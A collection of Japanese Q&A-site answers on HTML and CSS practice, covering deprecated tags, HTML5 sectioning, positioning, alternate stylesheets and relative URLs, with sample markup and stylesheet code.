＞<center>,<font>タグがなくなる 　なにをいまさら・・ 　1999年のHTML4.01の勧告以来!!!これらは強く非推奨扱いですよ。HTML4.01strictには、存在していません。 　そして『HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』ですから・・繰り返しますが、1999年の12月勧告時点です。 ＞HTML5でコーディングする際にはフォントの指定は、 　HTML5は勧告直前ではありますが、まだ勧告にいたっていません。HTML5を気にするより前にHTML4.01を復習するほうが良いでしょう。 　そもそも、HTMLのコーディングとは、 文書を読み解き、その文書を構成する要素に分解して、それぞれがどのような要素であるかをタグを使ってマークしていくものです。 　例えば、見出しなら<h1>～</h1>段落なら<p>～</p>と言う事です。HTMLの用意されている要素(タグのこと)で足りなければ、DIVをつかって<div class="header">ここは文書のヘッダ</header>、<div class="section">ここは本文</div>とDIVを使って・・ 　HTML4.01『DIV要素・・略・・は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 　もしコーディングをデザインと思われているのでしたら、それは根本的な認識が誤っています。 ＞そのため、HTML5でコーディングする際にはフォントの指定は、どのようにすれば良いのでしょうか？ 　HTMLで示された文書構造を利用して、スタイルシートでプレゼンテーションを指定していきます。 No.1さんが示された参考サイトは、その意味では最悪のパターンです。それじゃHTML4.01が勧告された当時に良く見かけた。 　<font color="red">が使えないから<span style="color:red">や<span class="red">と全く変わりません。 　HTML4.01だと、それが重要な語句なら<strong>ここは重要</strong>とマークアップして、重要な語句を赤文字で表現したいなら、スタイルシートでstrong{color:red;}とせよと言っている。 　まず、HTML4.01strictをマスターしなさい。FONTやCENTERなんてありません。 　 　　
<a href=""> <img src="" alt=""> <h2></h2> </a> こういう状態にしてあげればいいんじゃないでしょうか？ それでimgはインライン要素なので( http://rikiy.jp/report/css/20070220.html )CSSでimg{display: block;}としてあげればh2が改行されて表示されます。 詳しくは http://www.htmq.com/style/display.shtml
そうなってしまった場合、なかなか良い解決法はないでしょう。 　OKWebのサービスを利用しているYahoo！知恵袋,教えてgoo・・などは、一度登録されると長い期間保存されます。 [例]　http://oshiete.goo.ne.jp/qa/1.html 15年前のものですね。 　そのため、どんな方法をとっても、サイト名で検索する限り検索に引っかかります。 ★唯一の解決方法は、あなたのウェブサイト自体を引っ越す事です。 　^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 　残念ですが、これ以外の対策はありません。 ＞私のホームページのタイトル名を入力すると、 　一瞬迷ったのですが、これは「私のウェブサイトのトップページのタイトル名を入力すると」と言う意味ですよね。 　利用者であるうちは良いのですが、ウェブサイトを開設する立場になると、ホームページ( http://ja.wikipedia.org/wiki/%E3%83%9B%E3%83%BC% … )と言う言葉は厳密に用途に限らないと、意思の疎通が難しくなります。 ★質問箱などには、自身を特定されるような情報は書かない。 　ネットには様々な人がいます。自分では気が付かないうちに、誰かを不快な思いにさせてしまい予想外の反発を受けて、誹謗・中傷を受けることがあります。しかし、それが明確な誹謗中傷である場合は、管理側に申請することで訂正や削除・修正の対処はされます。・・・このサポートはどの質問箱も出来ています。・・・。ただし、第三者から見て誹謗・中傷とは言い切れない場合は対処されません。 ・質問箱管理者に修正や削除を申請する。 ・自身のウェブサイトを移動する。 　この二つしか対処の方法はありません。
他にもリンク集さサイトはいろいろありますので http://design-iketeru.azu-mi.com/
　⇒文字の中央そろえを一括で指定したい - HTML - 教えて！goo( http://oshiete.goo.ne.jp/qa/8160374.html ) はどうなったの？？？ 　
(1)下から6行目にある #footer a:hover{ background:url(../img/footer-link02.png) no-repeat; の最後に閉じタグ（}）が抜けてます。 正しくは、 #footer a:hover{ background:url(../img/footer-link02.png) no-repeat; } となります。 (2)下から3行目の.copyright{は、 .ではなく#です。 この2点でいかがでしょうか。
>>これと同じ（ような）ものを次<br>分のブログやホームページに設置したいのですが、どのように作ったら良いか全くわかりません。 通常は、PHPとかJava、あるいはPerlなどを使って、サーバサイドのプログラムでHtmlを生成するようになると思います。 >>ソース等をわかりやすく教えて頂けないでしょうか。 同様の機能をもつソースを探したうえで、上記に示したような言語の書籍を数冊読んで、その仕組みを勉強しないと、たとえサンプルソースを見つけて、眺めてみても何も理解できず、設置することもできないと思います。もしかすると、そこまでいくまでの道は、かなり遠いかもしれません。
＞ここから下は関係ないですけど 　のほうが重要で、それがわかると、その前の質問の答えが見えてくるでしょう。 ＞じゃあhtml4使えよってのはなしで 　HTML4.01を復習されることを強く勧めます。HTML5はHTML4.01の反省の元で作られたのですら・・。 　実はHTML4.01にも随所にHTML5とまったく同じことが書かれています。 A) 構造とプレゼンテーションの分離 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) B) DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) C) スタイルシートの概説( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　など、特にDIVやSPANは文書構造を補完するために使用し、その文書構造を元にスタイルシートでプレゼンテーションを指定していく・・・ということ。 　HTML4.01には、文書構造を補完するためにDIVを使わざるを得ませんでした。すなわち <body> 　<div class="header"> 　　<h1>見出し</h1> 　　<div class="nav"> 　　</div> 　</div> 　<div class="section"> 　　<h2>本文見出し</h2> 　　<p>・・・・</p> 　　<div class="section"> 　　</div> 　　<div class="aside"> 　　</div> 　</div> 　<div class="footer"> 　</div> </body> 　のようにマークアップしろと書かれています。上記(B)に!!明確に!! 　しかしながら、現実には理解できる人は少なく、相変わらず形は変わっても(C)で例示されているのと、内容的には変わらない使われ方がされてきました。 <div class="content"> 　<div id="leftMenue"> とかね。HTMLをデザイン(プレゼンテーション)のためのものと思われてきたのが最大の原因だと思います。 　その反省から「HTML5 では、文書をよりよく構造化するために、・・・要素が新しく追加されました。( http://standards.mitsue.co.jp/resources/w3c/TR/h … )」 　そのため、上記は <body> 　<header> 　　<h1>見出し</h1> 　　<nav> 　　</nav> 　</header> 　<section> 　　<h2>本文見出し</h2> 　　<p>・・・・</p> 　　<section> 　　</sectin> 　　<aside> 　　</aside> 　</section> 　<footer> 　</footer> </body> 　と書けるようになりました。これは、著者にとってもとってもメンテナンスが容易になり、スタイルシートもずっと簡単に書けるようになりました。 ★最初の質問 　HTML5では、DIVは安易に使えません。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから Authors are strongly encouraged to view the div element as an element of last resort, for when no other element is suitable. Use of more appropriate elements instead of the div element leads to better accessibility for readers and easier maintainability for authors. ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［4.5 Grouping content — HTML5( http://www.w3.org/TR/2012/CR-html5-20121217/grou … )］より 　---著者は、 div 要素を、他により適切な要素がないときなど、最後の最後手段として使用することを強く推奨します。DIVでないより適切な要素を使うことは、読者にとってはアクセシビリティ向上に、ウェブ制作者にとってはメンテナンス性の向上につながる。--- 　もし、質問に書かれた場面で使うなら、<article></article>(header,section,fooerをもつであろう完結した記事を示す)で囲うべきです。 　 Q＞それともdivで囲んでもdivが存在しないものとして振舞いますか？ 　『DIV要素とSPAN要素は、・・・【中略】・・・他のプレゼンテーション的語彙を示すことはない。 ( HTML4.01 http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 』 Q＞セクションをdivで囲むと見出しのランクは下がるの 　HTML5でsectionは、文書のアウトライン(階層)を示すために使われますから、sectionの階層で見出しレベルを知ることが出来ます。 html └body 　　├ header 　　├ section 　　│　├ h1 または h2 　　│　└ section 　　│　　　├ h1 または h3 　　｜　　　└section 　　│　　　　　├ h1 または h4 　　├ section 　　　　　├ h1 または h2 　そのために、h1⇒h6で階層を示す必要がなくなったために ・sectionでアウトラインを示し、すべてh1を使う ・sectionと見出しのレベルを併用する。 　のいずれかに統一することになります。示されたような書き方は間違いです。 　この文書構造を利用してスタイルシートが書けますから section{margin-left:1em;font-size:0.9em;} section h1,section h2,section h3,section h4,section h5,section h6{font-size:1.2em;} だけで、視覚系ブラウザには、階層を明示して表示されます。 ＞見出しのランクなんてcssがあればもはや何の意味もないし(だからh1で統一できるようにしたんでしょうｋど)、 　それは、あくまで視覚系ブラウザだけですよ。HTMLは、『どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。以下略・・・( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 ★HTMLはデザインのためではなく、様々なユーザーエージェント(検索エンジンも含む)のために、また再利用のために文書構造をマークアップする言語 ★スタイルシートは、その文書構造を利用してプレゼンテーションを指定するもの 　このふたつを明確に区別し活用してください。 ＞cssでは特にpositonとfloatは頭がおかしいと思うし、この二つがクソなので 　HTMLやCSSに対して誤解されていること、よくご存じないことがそのような感想になるのだと思います。決してそんなことはありません。従来は、視覚系ブラウザのために、本文とは関係のないナビゲーションをページの最初に書く必要がありましたが、absoluteがあるために、footerに書いたナビゲーションをページトップに表示できるようになりました。 ★HTML4.01の仕様書はHTML5のそれの十数分の一しかありません。一度全文に目を通して置かれることをお勧めします。 ★CSSも古い仕様ですが、CSS2の邦訳があります。これもよく読むこと 　たぶん、誤解が解消されると思います。 　
No.1です。 　スタイルシート(absoluteなど)を使用して強制的に配置させることは出来ますが、そのまえにHTML自体を根本から見直しましょう。 　そのように表示したいと言うことは、必ず文書の構造に根付いているのです。 <header> ・・・この部分は内容が変わらない固定されたもの </header> <nav> ナビゲーション </nav> <section> 本文 </section> <footer> </footer> あるいは、 </header> <section> 本文 　<nav> 　ナビゲーション 　</nav> </section> <footer> </footer> No.1で示したように縦サイズは指定していません。なぜなら、データ量は変化しますし、視覚弱者のユーザーは文字サイズを拡大してご覧になるかもしれない。それどころか、スタイルシート自体使わないか、自身のスタイルシートを使用されるかもしれない。もちろん印刷には使えないだろう。携帯電話やスマホじゃサイズが固定されると利用しずらい・・ ★HTMLは、様々な利用環境で利用できるからこそHTMLなのです。カタログを作るような用途でしたら、HTMLじゃなく、PDFなどを利用すべきです。 　一度、HTMLを見直してください。
ご存知かと思いますが、alignなどプレゼンテーションに関わる属性は使わないほうが良いでしょう。 align属性は、 「4.行または行グループ要素(TR、 THEAD、TFOOT、及び TBODY)に設定されている配置の属性値。 複数行をまたぐコマについては、配置のプロパティは、またぎはじめの部分のコマ定義から継承される。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 と書かれているように、継承されますから、 <table summary="テスト" border="1"><!-- summary必須 --> ＿<tbody align="center"><!-- tbodyは必須、なくても表示はされますが --> ＿＿<tr> ＿＿＿<td>aa</td><td>AAAA</td><td>aaaaaaaa</td> ＿＿</tr> ＿＿<tr> ＿＿＿<td>aaaaa</td><td>aa</td><td>aaa</td> ＿＿</tr> ＿</tbody> </table> でセルに継承されるはずです。 なお、今はこの様に書くことは少なくて <table summary="テスト" border="1"> ＿<tbody> ＿＿<tr> ＿＿＿<td>aa</td><td>AAAA</td><td>aaaaaaaa</td> ＿＿</tr> ＿＿<tr> ＿＿＿<td>aaaaa</td><td>aa</td><td>aaa</td> ＿＿</tr> ＿</tbody> </table> と書いて、スタイルシートで table[summary="テスト"]{text-align:center;} と指定するほうが良いです。 text-alignプロパティは、継承されますから親に指定すればすみます。
　A要素は行内要素で、その内容も行内要素でなければなりません。HTML5ではブロックも条件付で含めることが出来ます。ただし、いずれも必ずブロック要素の中になければなりません。 　ただ、例にあげられたマークアップは感心しないところがいくつかあります。 classは、あくまで、その要素の文書構造を示すために使用します。また他に適当な要素がある場合はそれを使います。 この場合は <a href="[URI]"><span lang="jp">ホーム</span><span lang="en">HOME</span></a> とか <a href="[URI]"><span title="HOME">ホーム</span></a> でよいのではないかと・・ ※A要素のclassは不要でしょう。href属性の値で区別できますから・・
<a href="home.html#start">home</a> という記述とのことなのでおそらく今回該当してないかとは思いますが、 <a href="home.html#○○○">home</a> で、○○○が日本語文字列だと、Safariでエラーになってしまうようです。。 また、ページ内でのリンク先のタグの指定は、 <div id="start">～～</div> のような形で「id」で指定されていますでしょうか・・・？ <a name="start">～</a> のような「name」の形だとうまくいかないことがあるようです。 にしても、Safariだけうまくいかない。。というのは解せないですね・・・ 以上、ご参考になれば幸いです。よろしくお願いいたします。
サーバー側からの指定でキャッシュをさせないというのは、「同じアクセスの仕方でも、リクエスト毎に返す内容が違うので、前のアクセス結果を再利用するな」という意図を伝えているわけなので、その意図通りに受け取ってもらっていれば検索サイトでもキャッシュされないでしょう。
＞ホント一番簡単で誰でも思いつきそうな設定で良かったんですね。何で気づかなかったのだろう 　実は、これは仕様書にも明確に書かれているのです。 　⇒リスト: 'list-style-type'、'list-style-image'、'list-style-position'、'list-style' 　　( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) の一番最後に 引用＿＿＿＿＿＿＿＿＿＿＿＿＿＿ここから 子孫セレクタのみを使うと意図した結果を得られないことがある。 次の文書で考えてみよう: ・・・【中略】・・・ 「level2」のリスト項目に'disc'のマーカーを意図している。 しかし、最初の規則はクラスセレクタを含んでいるので、カスケード処理の順序に従うと2つ目の規則が上書きされてしまう。 それに対して、次に示す規則のように子供セレクタを使えば問題は解決する: ・・・【中略】・・・ もう1つの解決法は、'list-style'をリスト種類の要素にのみ設定する方法である: ・・・【中略】・・・ 'list-style'の値はOL要素からLI要素へと継承されることになる。 リスト形式を指定するのにはこの方法を用いるよう推奨する。 引用￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで 　仕様書を読むのは、確かに面倒ですが、探せば必要な情報が見つかります。 なお、現行のCSS2.1はこの仕様書(邦訳CSS2.0)からいくつか改訂されています。 　⇒変更点(CSS2.1 Appendix C 邦訳)( http://www.d-toybox.com/spec/CSS2.1/appendixC/ ) 　⇒Cascading Style Sheets Level 2 Revision 1 (CSS 2.1) Specification( http://www.w3.org/TR/CSS2/ ) もあわせて目を通しておくと良いでしょう。 　セレクタやカスケーディングというCSS(カスケーディングスタイルシート)の根幹を学ばれると、スタイルシートだけではなく、HTMLもとっても簡潔に分かりやすくなります。
アメブロのRSSを読み込んでホームページに表示する方法がありますが、これはどうですか。 http://webdesignerwork.jp/ameblo/jqueryrss/ http://codingmania.net/jquery/380.html
何はともあれ、まず仕様書を確認する癖をつけましょう。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから また、著者は、「&」の代わりに「&amp;」(ASCII十進38)を用い、文字参照の冒頭――文字実体参照の開始区切り子――と誤解されるのを避けるべきである。 CDATA型の属性値には文字参照が出現できるので、著者は属性値においても「&amp;」を用いる必要がある。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［HTML Document Representation (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　正確な情報が得られますし、関連した情報もあわせて身につくでしょう。 　それで分からない時に、こういう場所を利用するのが良いです。 　実際に&が登場するとブラウザは、数値文字参照( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )か文字実体参照( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )であろうと、検討に入ります。 　⇒文字参照( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )
保存したファイルがUTF-8だったりすると、コピペし再保存したファイルはおそらくSJISでしょうから、文字コードの関係で多少ファイルサイズが小さくなることはあるでしょう。 そうじゃないというなら、情報が何も無いためこれ以上は無理。 再質問でもしてくださいな。
指摘された部分を修正すれば、エラーは出なくなります。 ・ulの中にh2を記述することはできない。 ・h2の中にliを記述することはできない。 ・a要素にname属性は定義されていない。 <!DOCTYPE html> <html lang="ja"> <head> <meta charset="UTF-8"> <title>講演会記録</title> </head> <body> <ul> <li><a href="#memo001">2012 講演会記録</a></li> <li><a href="#memo002">2013 講演会記録</a></li> </ul> <p id="memo001"> 2012　講演会内容 </p> <p id="memo002"> 2013　講演会内容 </p> </body> </html>
スタイルシートで行うには、 ・ルート要素はウィンドウサイズを100%とみなすこと ・ブロックは、直近のstatic以外の親コンテナブロックの位置やサイズを参照すること ・absoluteはその要素は指定されると、以後の要素は存在しなかったように配置されること ・relativeは本来の位置にあるように処理されること このあたりを覚えておけば難しくはないです。 　⇒9. 視覚整形モデル( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) [例] ★HTML4.01strict + CSS2.1 ★タブは＿に置換してあるので戻す。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- html,body{margin:0;padding:0;} html{height:100%;} h1,h2,h3,p{margin:0;line-height:1.6em;} body{min-height:100%;position:relative} div.article{padding-bottom:100px;width:80%;margin:0 auto;} div.footer{position:absolute;bottom:0;width:80%;} body{background-color:silver;} div.article{background-color:silver;} div.header{background-color:aqua;} div.section{background-color:silver;} div.footer{background-color:yellow;} --> ＿</style> </head> <body> ＿<div class="article"> ＿＿<div class="header"> ＿＿＿<h1>タイトル</h1> ＿＿＿<p>このページでは・・・・</p> ＿＿</div> ＿＿<div class="section"> ＿＿＿<h2>見出し</h2> ＿＿＿<p>1・・・</p> ＿＿＿<p>2・・・</p> ＿＿＿<p>3・・・</p> ＿＿＿<p>4・・・</p> ＿＿＿<p>5・・・</p> ＿＿＿<p>6・・・</p> ＿＿＿<p>7以下増減</p> <!--＿＿<p>8・・・</p> ＿＿＿<p>9・・・</p> ＿＿＿<p>10・・・</p> ＿＿＿<p>11・・・</p> ＿＿＿<p>12・・・</p> ＿＿＿<p>13・・・</p> ＿＿＿<p>14・・・</p> ＿＿＿<p>15・・・</p> ＿＿＿<p>16・・・</p> ＿＿＿<p>17・・・</p> ＿＿＿<p>18・・・</p> ＿＿＿<p>19・・・</p> ＿＿＿<p>20・・・</p> --> ＿＿</div> ＿＿<div class="footer"> ＿＿＿<h2>文書情報</h2> ＿＿＿<dl class="documentHistry"> ＿＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿＿<dd>2012-08-10</dd> ＿＿＿</dl> ＿＿＿<address>&copy; ORUKA1951 2012 - 2016 All Rights Reserved mailto:*****</address> ＿＿</div> ＿</div> </body> </html>
コードをハイライトしてくれるライブラリがいくつかあるようなので、 そちらを利用してみるのはいかがでしょうか・・・？ ○SyntaxHighlighter http://alexgorbatchev.com/SyntaxHighlighter/ http://javascript.webcreativepark.net/library/sy … ○google-code-prettify http://code.google.com/p/google-code-prettify/ http://greenapple-room.com/conc/user/TwitterBoot … ○CodePress http://www.skuare.net/test/CodePress.html 個人的には、SyntaxHighlighterが好みです＾＾
　ウェブサイトを作っている方がされているように、ローカルにHTTPサーバーを作ればよいだけでは？ 　LANで接続されているなら、どれかひとつ（すべてでも良いがややこしくなる）にapacheなどのHTTPサーバーをインストールするのが良いです。
>(2) ./bbs ./bbs/ この違いですが、bbsがディレクトリの場合は後者の方が良いです。 まず1点。 ./bbs でディレクトリにアクセスした場合、一般的には、./bbs/にリダイレクトされます。 「リダイレクト処理」が入る分だけサーバーやネットワークに付加が掛かることになります。 （といっても１～２パケットですので、個人レベルで気にするようなことではありませんが、プロなら気にすべきというレベルです。） 2点目。 ./bbs/でも./bbsでも、リダイレクトせずに ./bbs/index.html が表示されることがあります（サーバーの設定による）。 ですが、 ./bbs/index.htmlの中で<img src="image.jpg">と書かれていた場合、 ./bbs/ でアクセスした場合の./bbs/index.htmlに置けるimage.jpgは ./bbs/image.jpgを参照する この場合の基準パスは ./bbs/index.html と同じです。 ./bbs でアクセスした場合の./bbs/index.htmlに置けるimage.jpgは ./image.jpgを参照する（./bbs/の１つ上のディレクトリが基準） この場合の基準パスは ./index.html と同じです。 という違いが発生します。 サーバーの処理だけでなく、クライアントの処理も変わりますのでディレクトリには最後にスラッシュを付けた方が良いです。 参考URL：http://httpd.apache.org/docs/2.2/ja/mod/mod_dir. …
Ajaxがベストでしょうかね
結局イレギュラーなことをしたいというのでしたらjavascriptで飛ばしてみては？ （ユーザー環境に依存しますので完全には処理できません） <script> location.href="ttp;//example.com"; </script>
背景画像は印刷されるとまずいことが多いので背景はデフォルトでは印刷できません。 ブラウザの印刷設定で背景を印刷するにする。 印刷用スタイルシートで、content:url();にしておくほうが良いでしょう。 ディスプレイは、96dpiで表示されますが、プリンターの解像度は最低でも200dpiはあるので、大きな画像にして、display:block;width:180mm;height:auto;にするとかが良いですね。
たぶん文字コードの指定について誤解している。 <meta>タグはあくまでそのファイルの文字コードを「表明」するだけの物ととらえてください。 実際にはファイルそのものに文字コードの設定が存在し、本来ならブラウザはそちらに合わせ表示しようとします。 芸名と本名みたいなもんだと思ってくれればいいかと。 「設定した」と書いているのでおそらくそこを勘違いしてるかと思います。 ということでezhtmlもIE8も試してないのでただの推測ですが、HTMLファイルがUTF-8で保存されてませんか？ <!-- 文字コードの話してるのに文法チェッカー紹介してどうすんだ馬鹿 -->
No.2です。スタイルシート下記のほうがよいかも・・リキッドなのでスマホでも幅広でも対応可能(ウィンドウサイズを変えてみる) div.header div.nav{ border:2px dotted #433832; width: 60%;min-width:480px;max-width:800px; margin: 0 auto; position:relative; } div.header div.nav h2{ margin:0; background:#392D0D url(img/XXX.gif) no-repeat 50% 50%; height:100%;width:150px; position:absolute; top:0;left:0; text-indent:-100em;overflow:hidden; } div.header div.nav ul{ min-height:140px; list-style-image:url(../img/icon.gif); margin: 10px 20px 10px 160px; width:auto; }
もう一度だけ、最初から 1) HTMLをテキストエディタにコピーペーストして、適当なフォルダにtest.htmlで保存する。 2) 三種類のスタイルシートを 　[mediam.css] @charset "Shift_JIS"; body{font-size:2em;} 　[small.css] @charset "Shift_JIS"; body{font-size:0.8em;} 　[big.css] @charset "Shift_JIS"; body{font-size:2em;} を同じ場所に作ったstyleSheetフォルダーに入れる。 3) ブラウザで表示させて、表示メニューからスタイルを選択してjavascriptを使用しなくても変更されることを確認 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta http-equiv="Content-Script-Type" content="text/javascript"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rel="stylesheet" href="./styleSheet/mediam.css" type="text/css" id="mystyle"> ＿<link rel="Alternate StyleSheet" type="text/css" media="screen" href="./styleSheet/small.css" title="小さな文字"> ＿<link rel="Alternate StyleSheet" type="text/css" media="screen" href="./styleSheet/big.css" title="大きな文字"> ＿<link rel="Alternate StyleSheet" type="text/css" media="screen" href="./styleSheet/mediam.css" title="標準サイズ"> ＿<link rel="START" href="../index.html"> <script type="text/javascript"> <!-- ＿function styleCange(cssfile) {document.getElementById('mystyle').href = cssfile;} // --> </script> <style type="text/css"> <!-- html,body{margin:0;padding:0;} p{text-indent:1em;} ul.changeStyle,ul.changeStyle li{list-style:none;margin:0;padding:0;text-align:center;} ul.changeStyle li{width:6em;display:inline-block;} --> </style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<ul class="changeStyle"> ＿＿＿<li><a href="javascript;" onclick="javascript:styleCange('./styleSheet/small.css'); return false;">サイズ小</a></li> ＿＿＿<li><a href="javascript;" onclick="javascript:styleCange('./styleSheet/big.css'); return false;">サイズ大</a></li> ＿＿＿<li><a href="javascript;" onclick="javascript:styleCange('./styleSheet/mediam'); return false;">標準サイズ</a></li> ＿＿</ul> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<p>・・・</p> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2012-08-10</dd> ＿＿</dl> ＿＿<address>&copy; ORUKA1951 2012 - 2016 All Rights Reserved mailto:*****</address> ＿</div> </body> </html>
A No2です。 ＞今回は全くの番号なしがあるのでそのままでは使えそうにないですが～ 番号が無いのは最初のものだけではないのでしょうか？ ごく簡略化したものを… （私も知らないため、仕様書を見ながら記述したので、かなりいい加減です） div-h3で記述しましたが、liでもdtでも同様に可能と思います。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"> <html lang="ja"> <head><title>sample</title> <meta http-equiv="Content-Style-Type" content="text/css"> <style type="text/css"> #hoge *{ margin:0; padding:0; } #hoge h3{ margin-top:0.5em; counter-increment:item; font-size:1em; } #hoge h3:first-child{ margin:0; counter-reset:item -1; } #hoge h3:before{ content:counter(item)". "; } #hoge h3:first-child:before{ content:""; } #hoge p{ margin-left:1.5em; } </style> </head> <body> <div id="hoge"> <h3>はじめに</h3> <p>はじめにはじめに～～</p> <h3>個人情報の取得について</h3> <p>取得について取得について～～</p> <h3>個人情報の利用について</h3> <p>利用について利用について～～</p> <h3>個人情報の管理について</h3> <p>管理について管理について～～</p> </div> </body> </html>
よくわかってませんが…、ＰＣ用のサイトでしょうか？ （↓）は少し古い情報ではありますが、まだそのままなのではないでしょうか？ http://gigazine.net/news/20121122-google-map-ind … http://japanese.engadget.com/2012/11/23/google/
度々すみません。NO.2～4の答えは全部私です。 訂正した際にCSSを内部に書いてしまったのをそのままにしてしまいました。 これが完全版という事で、NO.2とNO.3は無視して下さい。。。 どこが悪いのかというと、HTMLもCSSも抜粋的なソースかと思いますので、断定できませんでした。 IEだけうまくいかないという事でしたね。IEは悪く言えばバグが多く融通が利かない。よく言えば文法などに正確でうるさいブラウザです（良く言ってないか…）。それに対してFirefoxやSafari等は結構文法や書き方を間違えていても気を利かして思い通りに表示してくれます。下にちゃんと表示される（ハズ）ソースを書きました（勝手にHTMLは4.01のtransitionalにしちゃいました。）ので本当のソースと見比べてヒントにして頂ければと思います。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> <html lang="ja"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <title>あああああ</title> <meta http-equiv="Content-Style-Type" content="text/css"> <link rel="stylesheet" media="all" href="text.css" type="text/css" /> </head> <body>あいうえお</body> </html> 【CSS部分】 @charset "UTF-8"; body{ background : url(./img/back.jpg) left top repeat; }
＞ページ更新の際は該当HTMLファイルをローカルに落とし、テキストエディタで手打ちで書き換え、再アップするという手段で更新しています。 　なら、FTPソフトがあるのでしょうから、すべてダウンロードしてくれば良いです。CMSなど動的に作成するものがないのでしたら、ダウンロードしてから、grepなりで。 　Windows用のgrepもあります。 　まあ、テキストエディタで検索機能を持つものもあります。たとえばEmEditor--これでフォルダー内を検索で該当するファイルにリンクしているファイルをすべて拾い出してしまえば良いです。文書内に、href="[^"]*abcdefg.pdf" を正規表現で探す。 　 　
WebサイトはＨＴＭＬという物で書きたいものを書きインターネット上に公開し、見てもらう場所の事をWebサイトと言います。 Webアプリはインターネット上で「ＪａｖａＳｃｒｉｐｔ」というプログラミング言語を使った電子掲示板、ネット販売、ログイン・新規登録などに使われています。 Webサイトは見てもらう Webアプリはサイトに情報を送る という違いだと思います
質問の意味がわからないので補足してください。 ＞Cookie を使わず、訪問した状態を一定期間、維持する方法 　どこ(誰)が保存するのですか？ 　Cookieは、ユーザー側が「訪問した状態を一定期間、維持する方法」方法で、サーバー側は無関係です。サーバーがHTTP応答ヘッダに含めて発行する「割符」をユーザーエージェントに対して送信し、それをユーザーエージェントが保存しておくものです。次回のHTTP要求のときに、HTTP要求ヘッダに含めてサーバーに送信して、サーバーはそれを解析して利用するだけで、サーバー側には一切データはありません。Cookieはそのための手法です。 ＞プログラムを使わず、ユーザエージェントの取得する方法を考えています。 　ユーザーエージェントとは、Webで使用されるプログラムのことで、たとえばfirefoxとかInternet Explorerがユーザーエージェントです。「プログラムを使わず」の意味がわかりません。ユーザーエージェント自体がプログラムなのですから。 　また、「ユーザエージェントの取得する方法」は助詞(てにおは)がおかしいのでは？？。ユーザーエージェント【を】取得する方法でしたら、取得と言う動作自体がサーバーのプログラムの動作ですので、『プログラムを使わず、ユーザエージェントを取得する方法』だと矛盾してしまいます。 　そもそもユーザーエージェントはブラウザなどのプログラムの型式のようなものですから、もし【主語がユーザーエージェント】でしたら、取得するも何もないですよね。たとえば私が使用しているユーザーエージェントは Mozilla/5.0 (Windows NT 5.1; rv:16.0) Gecko/20100101 Firefox/16.0 となります。 　ユーザーエージェント自体は、サーバーに対してHTTP要求などをするときに、必ずと言って良いくらいCookieとともに含まれていますが、それを取得するためには、必ずプログラムが必要です。しかし、Cookieのようにユーザー(ユーザーエージェントやその状況)を特定することは不可能です。同じブラウザを使用している人はすべて同じですから。 よって、質問の一行目以降をすべて無視して ＞Cookie を使わず、訪問した状態を一定期間、維持する方法、 　だけについてでしたら、【プログラムは必須ですが】QUERY_STRINGやPATH_INFOを使用します。しかし、Cookieと異なりサーバー側に情報を保存しなければなりませんので、ややこしくなることと、セキュリティ上で穴だらけになります。もちろんPOSTを使って標準入力で保持するとその問題は回避できるでしょう。SSL通信を使えばCookie並みにセキュリティは保てるでしょう。 QUERY_STRINGとは、URL中の?以降 PATH_INFOとは、ドメイン名以降?まで [例] Enviroment Variable and FORM,COOKIE ( http://hpcgi1.nifty.com/Iruka/ENV_FORM.cgi/oshie … ) で、/oshiete.goo.ne.jp/qa/8136870.htmlがPATH_INFO,name=yuki-01がQUERY_STRINGになります。 　
